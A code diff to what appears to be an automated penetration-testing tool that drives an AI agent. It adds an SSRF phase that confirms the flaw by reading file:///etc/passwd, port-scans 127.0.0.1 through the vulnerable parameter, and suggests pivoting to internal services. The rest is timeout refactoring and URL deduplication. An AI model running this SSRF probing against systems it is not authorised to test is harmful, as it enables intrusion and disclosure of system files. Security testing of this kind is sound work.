@@ -34,6 +34,8 @@ import sys
 from pathlib import Path
 from typing import Any
 
+from kryon.util.concurrency import run_with_timeout as _run_with_timeout
+
 logger = logging.getLogger(__name__)
 
 
@@ -521,6 +523,104 @@ def _run_web_enum_phase(url: str, *, timeout: int = 180) -> list:
     return findings
 
 
+def _is_ip_literal(host: str) -> bool:
+    import ipaddress
+
+    try:
+        ipaddress.ip_address(host)
+        return True
+    except ValueError:
+        return False
+
+
+def _make_ssrf_fetcher(target_ip: str, timeout: int = 8):
+    """Build an HTTP fetcher (method, base_url, params) -> (status, body) for the
+    SSRF prober. GET puts params in the query, POST in a urlencoded body. We send
+    the request to the target; the SERVER performs the SSRF fetch of the payload.
+
+    vhost handling (no DNS / no /etc/hosts in the container): when base_url's host
+    is NOT an IP, the request goes to ``target_ip`` with a ``Host:`` header — the
+    same trick web_enum uses, so it works without resolving the vhost."""
+    import urllib.error
+    import urllib.parse
+    import urllib.request
+
+    def _fetch(method: str, base_url: str, params: dict) -> tuple[int, str]:
+        try:
+            host = urllib.parse.urlparse(base_url).hostname or ""
+            headers: dict = {}
+            real = base_url
+            if host and not _is_ip_literal(host):
+                real = base_url.replace(host, target_ip, 1)
+                headers["Host"] = host
+            if method == "GET":
+                sep = "&" if "?" in real else "?"
+                url = real + sep + urllib.parse.urlencode(params)
+                req = urllib.request.Request(url, method="GET", headers=headers)
+            else:
+                data = urllib.parse.urlencode(params).encode()
+                req = urllib.request.Request(real, data=data, method="POST", headers=headers)
+            with urllib.request.urlopen(req, timeout=timeout) as resp:
+                return resp.status, resp.read(600_000).decode("utf-8", errors="replace")
+        except urllib.error.HTTPError as e:
+            body = e.read(600_000).decode("utf-8", errors="replace") if e.fp else ""
+            return e.code, body
+        except Exception:  # noqa: BLE001 — a failed probe is just a miss
+            return 0, ""
+
+    return _fetch
+
+
+def _run_ssrf_phase(urls: list[str], *, target_ip: str, timeout: int = 8) -> list:
+    """F-SSRF — Deterministic SSRF exploitation BEFORE/alongside the LLM.
+
+    For each URL (the target + vhosts web_enum discovered), find the SSRF param,
+    confirm via file:///etc/passwd, and port-scan 127.0.0.1 internally. Injects
+    confirmed SSRF + reachable internal ports as ground truth — the agent reaches
+    the SSRF stage but loops instead of systematizing the internal port-scan.
+    ACTIVE only. Skips silently on error."""
+    try:
+        from kryon.cli.engage import Finding
+        from kryon.intelligence.ssrf_probe import probe_ssrf
+    except ImportError:
+        return []
+
+    from urllib.parse import urlparse
+
+    fetcher = _make_ssrf_fetcher(target_ip, timeout)
+    findings: list = []
+    for url in urls:
+        try:
+            res = probe_ssrf(url, fetcher=fetcher)
+        except Exception:  # noqa: BLE001 — never break the run
+            continue
+        if not res.param:
+            continue
+        host = urlparse(url).hostname or url
+        ports = sorted(f.port for f in res.findings if f.kind == "internal_port")
+        ports_txt = f" Internal ports reachable via SSRF: {ports}." if ports else ""
+        leaked = next((f.evidence for f in res.findings if f.kind == "file_read"), "")
+        proof = (
+            "file:///etc/passwd readable"
+            if leaked
+            else "server-side fetch confirmed (loopback port divergence)"
+        )
+        findings.append(
+            Finding(
+                cwe="CWE-918",
+                severity="CRITICAL" if ports else "HIGH",
+                host=host,
+                rule_id="SSRF-CONFIRMED",
+                message=(
+                    f"SSRF confirmed on {url} via {res.method} param '{res.param}': {proof}.{ports_txt} "
+                    f"Pivot: hit the internal service(s) through {res.param}=http://127.0.0.1:<port>/."
+                ),
+                evidence=(f"/etc/passwd leak: {leaked[:120]}" if leaked else f"{res.method} {res.param}= SSRF sink"),
+            )
+        )
+    return findings
+
+
 def _run_webexploit_phase(
     url: str,
     *,
@@ -528,6 +628,7 @@ def _run_webexploit_phase(
     max_depth: int = 2,
     max_urls: int = 40,
     web_auth: dict | None = None,
+    nuclei_timeout: int = 0,
 ) -> list:
     """F57 deterministic web-pentest sweep → engage.Finding list (Phase 5).
 
@@ -560,7 +661,15 @@ def _run_webexploit_phase(
         def _factory() -> HttpSession:
             return HttpSession(base_url=url, verify_tls=False)
 
-        report = run_engagement(session, _factory, graph, base_url=url, enable_nuclei=enable_nuclei, web_auth=web_auth)
+        report = run_engagement(
+            session,
+            _factory,
+            graph,
+            base_url=url,
+            enable_nuclei=enable_nuclei,
+            nuclei_timeout=nuclei_timeout,
+            web_auth=web_auth,
+        )
     except Exception:  # noqa: BLE001 — LLM agent still runs
         return []
 
@@ -694,6 +803,17 @@ def run_investigate(args: argparse.Namespace) -> int:
         urls_to_check = list(hints.get("urls") or [])
         if args.url and args.url not in urls_to_check:
             urls_to_check.append(args.url)
+        # Dedup: the prompt URL-extractor and --url routinely yield the same host
+        # with/without a trailing slash, which made the expensive per-URL phases
+        # (ffuf web-enum) run twice. Normalize on trailing slash + case.
+        _seen_urls: set[str] = set()
+        _deduped_urls: list[str] = []
+        for _u in urls_to_check:
+            _key = _u.rstrip("/").lower()
+            if _key not in _seen_urls:
+                _seen_urls.add(_key)
+                _deduped_urls.append(_u)
+        urls_to_check = _deduped_urls
         # Backstop wall-bound per URL. The detectors carry their own per-probe
         # timeouts, but this guarantees one misbehaving detector can't block the
         # whole run (which is sync here, before the async agent loop).
@@ -702,19 +822,18 @@ def run_investigate(args: argparse.Namespace) -> int:
         _det_timeout = float(os.environ.get("KRYON_DETERMINISTIC_TIMEOUT_S", "120"))
         for u in urls_to_check:
             try:
-                with concurrent.futures.ThreadPoolExecutor(max_workers=1) as _ex:
-                    _fut = _ex.submit(
-                        _run_deterministic_phase,
-                        u,
-                        ssh_user=args.ssh_user,
-                        ssh_password=args.ssh_pass,
-                        ssh_key=args.ssh_key,
-                        db_user=args.db_user,
-                        db_password=args.db_pass,
-                        include_dns=args.include_dns_checks,
-                        include_smb=args.include_smb_checks,
-                    )
-                    df = _fut.result(timeout=_det_timeout)
+                df = _run_with_timeout(
+                    _run_deterministic_phase,
+                    u,
+                    ssh_user=args.ssh_user,
+                    ssh_password=args.ssh_pass,
+                    ssh_key=args.ssh_key,
+                    db_user=args.db_user,
+                    db_password=args.db_pass,
+                    include_dns=args.include_dns_checks,
+                    include_smb=args.include_smb_checks,
+                    wall_timeout=_det_timeout,
+                )
             except concurrent.futures.TimeoutError:
                 console.print(f"[yellow]⚠ fase determinista excedió {_det_timeout:.0f}s para {u} — saltando[/yellow]")
                 df = None
@@ -737,9 +856,9 @@ def run_investigate(args: argparse.Namespace) -> int:
                     continue
                 try:
                     console.print(f"[cyan]🌐 web-enum phase:[/cyan] {u} (dirs + vhosts via ffuf)")
-                    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as _ex2:
-                        _fut2 = _ex2.submit(_run_web_enum_phase, u, timeout=int(_wenum_timeout))
-                        wf = _fut2.result(timeout=_wenum_timeout + 30)
+                    wf = _run_with_timeout(
+                        _run_web_enum_phase, u, timeout=int(_wenum_timeout), wall_timeout=_wenum_timeout + 30
+                    )
                     if wf:
                         console.print(f"[cyan]🌐 web-enum:[/cyan] {len(wf)} findings en {u}")
                         deterministic_findings.extend(wf)
@@ -747,6 +866,44 @@ def run_investigate(args: argparse.Namespace) -> int:
                     console.print(f"[yellow]⚠ web-enum excedió {_wenum_timeout:.0f}s para {u} — saltando[/yellow]")
                 except Exception as e:  # noqa: BLE001 — never break the run
                     console.print(f"[yellow]web-enum warning ({u}): {e}[/yellow]")
+
+        # F-SSRF — deterministic SSRF exploitation against the target + the vhosts
+        # web_enum discovered (where the vulnerable app usually lives). Finds the
+        # SSRF param, confirms via file://, and port-scans 127.0.0.1 internally —
+        # the step the agent loops on. ACTIVE only. Injects confirmed SSRF +
+        # reachable internal ports as ground truth.
+        if active:
+            import re as _re
+
+            _ssrf_targets: list[str] = list(urls_to_check)
+            for _f in deterministic_findings:
+                if getattr(_f, "rule_id", "") == "WEB-ENUM-VHOST":
+                    _m = _re.search(r"discovered:\s*([A-Za-z0-9.\-]+)", getattr(_f, "message", ""))
+                    if _m:
+                        _ssrf_targets.append(f"http://{_m.group(1)}")
+            _ssrf_targets = list(dict.fromkeys(_ssrf_targets))  # dedup, keep order
+            # The vhost rewrite needs the target's IP (no DNS in the container).
+            from urllib.parse import urlparse as _up
+
+            _hosts = [h for u in urls_to_check if (h := _up(u).hostname)]
+            _target_ip = next((h for h in _hosts if _is_ip_literal(h)), _hosts[0] if _hosts else "")
+            try:
+                console.print(
+                    f"[cyan]🎯 ssrf phase:[/cyan] {len(_ssrf_targets)} target(s) (param + internal port-scan)"
+                )
+                sf = _run_with_timeout(
+                    _run_ssrf_phase,
+                    _ssrf_targets,
+                    target_ip=_target_ip,
+                    wall_timeout=float(os.environ.get("KRYON_SSRF_TIMEOUT_S", "360")),
+                )
+                if sf:
+                    console.print(f"[cyan]🎯 ssrf:[/cyan] {len(sf)} confirmado(s)")
+                    deterministic_findings.extend(sf)
+            except concurrent.futures.TimeoutError:
+                console.print("[yellow]⚠ ssrf phase excedió el budget — saltando[/yellow]")
+            except Exception as e:  # noqa: BLE001 — never break the run
+                console.print(f"[yellow]ssrf phase warning: {e}[/yellow]")
 
         # F57 webexploit sweep — ACTIVE only (sends payloads). Adds the unified
         # deterministic web-vuln coverage (SQLi/XSS/LFI/SSTI/cmd-inj/XXE/IDOR/
@@ -776,9 +933,14 @@ def run_investigate(args: argparse.Namespace) -> int:
                 if not u.lower().startswith(("http://", "https://")):
                     continue
                 try:
-                    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as _ex:
-                        _fut = _ex.submit(_run_webexploit_phase, u, enable_nuclei=enable_nuclei, web_auth=_web_auth)
-                        wf = _fut.result(timeout=_wx_timeout)
+                    wf = _run_with_timeout(
+                        _run_webexploit_phase,
+                        u,
+                        enable_nuclei=enable_nuclei,
+                        web_auth=_web_auth,
+                        nuclei_timeout=_wx_timeout,
+                        wall_timeout=_wx_timeout,
+                    )
                 except concurrent.futures.TimeoutError:
                     console.print(f"[yellow]⚠ webexploit sweep excedió {_wx_timeout:.0f}s para {u} — saltando[/yellow]")
                     wf = None
